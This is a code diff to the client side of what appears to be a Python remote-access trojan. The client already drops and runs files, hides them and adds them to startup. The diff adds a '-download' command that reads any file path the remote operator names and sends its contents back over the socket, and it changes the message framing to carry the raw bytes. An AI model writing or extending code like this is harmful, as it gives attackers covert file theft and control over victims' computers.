@@ -6,7 +6,7 @@ from os import getlogin, getenv, startfile, system, chdir, getcwd
 
 class Socket:
 
-    header = 10
+    header = 20
     established = False
     cmd_received = False
     message_in_stock = False
@@ -50,6 +50,12 @@ class Socket:
             cmd = cmd.replace("-batch ", "")
 
             drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
+            return
+
+        elif "-download" in cmd:
+            path = cmd[10:]
+            self.download_file(path)
+            return
 
         else:
 
@@ -78,15 +84,27 @@ class Socket:
             self.send_msg(output)
             return
 
-    def send_msg(self, msg):
-        try:
+    def send_msg(self, msg, download=False):
+        if download:
+            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
+        else:
             msg = dumps(msg)
             msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
+        try:
             self.active_socket.send(msg)
-            self.message_in_stock = False
             self.established = True
         except(ConnectionResetError, ConnectionAbortedError, OSError):
             self.established = False
+
+    def download_file(self, path):
+        try:
+            file = open(path, "rb")
+            file_content = file.read()
+            file.close()
+            self.send_msg(file_content, download=True)
+            return
+        except (PermissionError, FileNotFoundError):
+            return
 
     @staticmethod
     def get_parent_path(path):
